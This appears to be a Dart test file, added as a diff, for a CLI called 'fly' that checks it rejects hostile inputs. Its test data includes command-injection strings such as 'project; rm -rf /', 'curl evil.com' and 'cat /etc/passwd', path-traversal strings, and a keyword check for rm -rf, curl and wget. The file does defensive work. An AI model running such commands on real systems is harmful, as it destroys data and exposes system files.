@@ -1,0 +1,513 @@
+import 'dart:convert';
+import 'dart:io';
+
+import 'package:flutter_test/flutter_test.dart';
+import 'package:path/path.dart' as path;
+import 'package:process/process.dart';
+
+void main() {
+  group('Security Review', () {
+    late Directory tempDir;
+    late ProcessManager processManager;
+
+    setUpAll(() {
+      processManager = const LocalProcessManager();
+    });
+
+    setUp(() {
+      tempDir = Directory.systemTemp.createTempSync('fly_security_test_');
+    });
+
+    tearDown(() {
+      if (tempDir.existsSync()) {
+        tempDir.deleteSync(recursive: true);
+      }
+    });
+
+    group('Input Validation Security', () {
+      test('project name injection attempts are blocked', () async {
+        final maliciousNames = [
+          'project; rm -rf /',
+          'project && curl evil.com',
+          'project | cat /etc/passwd',
+          r'project`whoami`',
+          'project\$(id)',
+          'project; ls -la',
+          'project && echo "hacked"',
+        ];
+
+        for (final maliciousName in maliciousNames) {
+          final result = await processManager.run([
+            'dart',
+            'run',
+            'packages/fly_cli/bin/fly.dart',
+            'create',
+            maliciousName,
+            '--template=minimal',
+            '--output=json',
+          ], workingDirectory: tempDir.path);
+
+          expect(result.exitCode, equals(1));
+          
+          final output = json.decode(result.stdout as String) as Map<String, dynamic>;
+          expect(output['success'], isFalse);
+          expect((output['error'] as Map<String, dynamic>)['message'], contains('Invalid project name'));
+        }
+      });
+
+      test('path traversal attempts are blocked', () async {
+        final traversalPaths = [
+          '../../../etc/passwd',
+          r'..\..\..\windows\system32',
+          '....//....//....//etc//passwd',
+          '../etc/passwd',
+          r'..\windows\system32',
+        ];
+
+        for (final traversalPath in traversalPaths) {
+          final result = await processManager.run([
+            'dart',
+            'run',
+            'packages/fly_cli/bin/fly.dart',
+            'create',
+            traversalPath,
+            '--template=minimal',
+            '--output=json',
+          ], workingDirectory: tempDir.path);
+
+          expect(result.exitCode, equals(1));
+          
+          final output = json.decode(result.stdout as String) as Map<String, dynamic>;
+          expect(output['success'], isFalse);
+        }
+      });
+
+      test('special characters in input are handled safely', () async {
+        const specialChars = [
+          'project<test>',
+          'project"test"',
+          "project'test'",
+          'project\ntest',
+          'project\ttest',
+          'project\rtest',
+          'project\0test',
+        ];
+
+        for (final specialChar in specialChars) {
+          final result = await processManager.run([
+            'dart',
+            'run',
+            'packages/fly_cli/bin/fly.dart',
+            'create',
+            specialChar,
+            '--template=minimal',
+            '--output=json',
+          ], workingDirectory: tempDir.path);
+
+          expect(result.exitCode, equals(1));
+          
+          final output = json.decode(result.stdout as String) as Map<String, dynamic>;
+          expect(output['success'], isFalse);
+        }
+      });
+
+      test('very long input is handled safely', () async {
+        final longName = 'a' * 10000;
+        
+        final result = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'create',
+          longName,
+          '--template=minimal',
+          '--output=json',
+        ], workingDirectory: tempDir.path);
+
+        expect(result.exitCode, equals(1));
+        
+        final output = json.decode(result.stdout as String) as Map<String, dynamic>;
+        expect(output['success'], isFalse);
+      });
+    });
+
+    group('File System Security', () {
+      test('file operations are restricted to working directory', () async {
+        final projectName = 'file_security_test';
+        
+        final result = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'create',
+          projectName,
+          '--template=minimal',
+          '--output=json',
+        ], workingDirectory: tempDir.path);
+
+        expect(result.exitCode, equals(0));
+        
+        final projectPath = path.join(tempDir.path, projectName);
+        expect(Directory(projectPath).existsSync(), isTrue);
+        
+        // Verify files are created only in the project directory
+        expect(File(path.join(projectPath, 'pubspec.yaml')).existsSync(), isTrue);
+        expect(File(path.join(projectPath, 'lib', 'main.dart')).existsSync(), isTrue);
+        
+        // Verify no files are created outside the project directory
+        expect(File(path.join(tempDir.path, '..', 'malicious_file.txt')).existsSync(), isFalse);
+      });
+
+      test('directory traversal in file operations is prevented', () async {
+        final projectName = 'traversal_test';
+        
+        final result = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'create',
+          projectName,
+          '--template=minimal',
+          '--output=json',
+        ], workingDirectory: tempDir.path);
+
+        expect(result.exitCode, equals(0));
+        
+        final projectPath = path.join(tempDir.path, projectName);
+        
+        // Verify project files are created in correct location
+        expect(File(path.join(projectPath, 'pubspec.yaml')).existsSync(), isTrue);
+        
+        // Verify no files are created in parent directories
+        expect(File(path.join(tempDir.path, '..', 'pubspec.yaml')).existsSync(), isFalse);
+      });
+
+      test('file permissions are set correctly', () async {
+        final projectName = 'permissions_test';
+        
+        final result = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'create',
+          projectName,
+          '--template=minimal',
+          '--output=json',
+        ], workingDirectory: tempDir.path);
+
+        expect(result.exitCode, equals(0));
+        
+        final projectPath = path.join(tempDir.path, projectName);
+        
+        // Verify files are readable
+        final pubspecFile = File(path.join(projectPath, 'pubspec.yaml'));
+        expect(pubspecFile.existsSync(), isTrue);
+        
+        final content = pubspecFile.readAsStringSync();
+        expect(content, isNotEmpty);
+      });
+    });
+
+    group('Command Injection Security', () {
+      test('command arguments are properly escaped', () async {
+        final projectName = 'command_injection_test';
+        
+        final result = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'create',
+          projectName,
+          '--template=minimal',
+          '--organization=com.test; rm -rf /',
+          '--output=json',
+        ], workingDirectory: tempDir.path);
+
+        expect(result.exitCode, equals(0));
+        
+        final projectPath = path.join(tempDir.path, projectName);
+        expect(Directory(projectPath).existsSync(), isTrue);
+        
+        // Verify project was created successfully despite malicious organization
+        expect(File(path.join(projectPath, 'pubspec.yaml')).existsSync(), isTrue);
+      });
+
+      test('template names are validated', () async {
+        final projectName = 'template_validation_test';
+        
+        final result = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'create',
+          projectName,
+          '--template=../../../etc/passwd',
+          '--output=json',
+        ], workingDirectory: tempDir.path);
+
+        expect(result.exitCode, equals(1));
+        
+        final output = json.decode(result.stdout as String) as Map<String, dynamic>;
+        expect(output['success'], isFalse);
+        expect((output['error'] as Map<String, dynamic>)['message'], contains('Template'));
+      });
+
+      test('platform arguments are validated', () async {
+        final projectName = 'platform_validation_test';
+        
+        final result = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'create',
+          projectName,
+          '--template=minimal',
+          '--platforms=malicious_platform',
+          '--output=json',
+        ], workingDirectory: tempDir.path);
+
+        expect(result.exitCode, equals(1));
+        
+        final output = json.decode(result.stdout as String) as Map<String, dynamic>;
+        expect(output['success'], isFalse);
+      });
+    });
+
+    group('JSON Output Security', () {
+      test('JSON output is properly escaped', () async {
+        final projectName = 'json_security_test';
+        
+        final result = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'create',
+          projectName,
+          '--template=minimal',
+          '--output=json',
+        ], workingDirectory: tempDir.path);
+
+        expect(result.exitCode, equals(0));
+        expect(result.stdout, isNotEmpty);
+        
+        // Verify JSON is valid and properly escaped
+        final output = json.decode(result.stdout as String) as Map<String, dynamic>;
+        expect(output, isA<Map<String, dynamic>>());
+        expect(output['success'], isTrue);
+      });
+
+      test('error messages in JSON are safe', () async {
+        final result = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'create',
+          'invalid<project>name',
+          '--template=minimal',
+          '--output=json',
+        ], workingDirectory: tempDir.path);
+
+        expect(result.exitCode, equals(1));
+        expect(result.stdout, isNotEmpty);
+        
+        // Verify error JSON is valid and safe
+        final output = json.decode(result.stdout as String) as Map<String, dynamic>;
+        expect(output, isA<Map<String, dynamic>>());
+        expect(output['success'], isFalse);
+        expect(output['error'], isA<Map<String, dynamic>>());
+      });
+    });
+
+    group('Resource Exhaustion Security', () {
+      test('large project names are handled safely', () async {
+        final largeName = 'a' * 1000;
+        
+        final result = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'create',
+          largeName,
+          '--template=minimal',
+          '--output=json',
+        ], workingDirectory: tempDir.path);
+
+        expect(result.exitCode, equals(1));
+        
+        final output = json.decode(result.stdout as String) as Map<String, dynamic>;
+        expect(output['success'], isFalse);
+      });
+
+      test('multiple concurrent operations are handled safely', () async {
+        final projectNames = List.generate(10, (index) => 'concurrent_security_test_$index');
+        final futures = <Future<ProcessResult>>[];
+        
+        for (final projectName in projectNames) {
+          futures.add(processManager.run([
+            'dart',
+            'run',
+            'packages/fly_cli/bin/fly.dart',
+            'create',
+            projectName,
+            '--template=minimal',
+            '--output=json',
+          ], workingDirectory: tempDir.path));
+        }
+        
+        final results = await Future.wait(futures);
+        
+        // Verify all operations completed successfully
+        for (final result in results) {
+          expect(result.exitCode, equals(0));
+        }
+      });
+    });
+
+    group('Template Security', () {
+      test('template content is safe', () async {
+        final projectName = 'template_security_test';
+        
+        final result = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'create',
+          projectName,
+          '--template=minimal',
+          '--output=json',
+        ], workingDirectory: tempDir.path);
+
+        expect(result.exitCode, equals(0));
+        
+        final projectPath = path.join(tempDir.path, projectName);
+        
+        // Check generated files for suspicious content
+        final pubspecContent = File(path.join(projectPath, 'pubspec.yaml')).readAsStringSync();
+        expect(pubspecContent.contains('rm -rf'), isFalse);
+        expect(pubspecContent.contains('curl'), isFalse);
+        expect(pubspecContent.contains('wget'), isFalse);
+        expect(pubspecContent.contains('eval'), isFalse);
+        
+        final mainContent = File(path.join(projectPath, 'lib', 'main.dart')).readAsStringSync();
+        expect(mainContent.contains('rm -rf'), isFalse);
+        expect(mainContent.contains('curl'), isFalse);
+        expect(mainContent.contains('wget'), isFalse);
+        expect(mainContent.contains('eval'), isFalse);
+      });
+
+      test('template variables are properly escaped', () async {
+        final projectName = 'template_escape_test';
+        
+        final result = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'create',
+          projectName,
+          '--template=minimal',
+          '--output=json',
+        ], workingDirectory: tempDir.path);
+
+        expect(result.exitCode, equals(0));
+        
+        final projectPath = path.join(tempDir.path, projectName);
+        
+        // Check that project name is properly escaped in generated files
+        final pubspecContent = File(path.join(projectPath, 'pubspec.yaml')).readAsStringSync();
+        expect(pubspecContent.contains('name: $projectName'), isTrue);
+        
+        final mainContent = File(path.join(projectPath, 'lib', 'main.dart')).readAsStringSync();
+        expect(mainContent.contains('TemplateEscapeTestApp'), isTrue);
+      });
+    });
+
+    group('Network Security', () {
+      test('no network requests are made during project creation', () async {
+        final projectName = 'network_security_test';
+        
+        final result = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'create',
+          projectName,
+          '--template=minimal',
+          '--offline',
+          '--output=json',
+        ], workingDirectory: tempDir.path);
+
+        expect(result.exitCode, equals(0));
+        
+        final projectPath = path.join(tempDir.path, projectName);
+        expect(Directory(projectPath).existsSync(), isTrue);
+      });
+
+      test('doctor command does not leak sensitive information', () async {
+        final result = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'doctor',
+          '--output=json',
+        ], workingDirectory: tempDir.path);
+
+        expect(result.exitCode, equals(0));
+        
+        final output = json.decode(result.stdout as String) as Map<String, dynamic>;
+        expect(output['success'], isTrue);
+        
+        // Verify no sensitive information is leaked
+        final outputString = json.encode(output);
+        expect(outputString.contains('password'), isFalse);
+        expect(outputString.contains('secret'), isFalse);
+        expect(outputString.contains('token'), isFalse);
+        expect(outputString.contains('key'), isFalse);
+      });
+    });
+
+    group('Process Security', () {
+      test('no external processes are spawned unnecessarily', () async {
+        final projectName = 'process_security_test';
+        
+        final result = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'create',
+          projectName,
+          '--template=minimal',
+          '--output=json',
+        ], workingDirectory: tempDir.path);
+
+        expect(result.exitCode, equals(0));
+        
+        final projectPath = path.join(tempDir.path, projectName);
+        expect(Directory(projectPath).existsSync(), isTrue);
+        
+        // Verify project was created without spawning external processes
+        expect(File(path.join(projectPath, 'pubspec.yaml')).existsSync(), isTrue);
+      });
+
+      test('plan mode does not execute dangerous operations', () async {
+        final projectName = 'plan_security_test';
+        
+        final result = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'create',
+          projectName,
+          '--template=minimal',
+          '--plan',
+          '--output=json',
+        ], workingDirectory: tempDir.path);
+
+        expect(result.exitCode, equals(0));
+        
+        // Verify no files were created in plan mode
+        final projectPath = path.join(tempDir.path, projectName);
+        expect(Directory(projectPath).existsSync(), isFalse);
+      });
+    });
+  });
+}
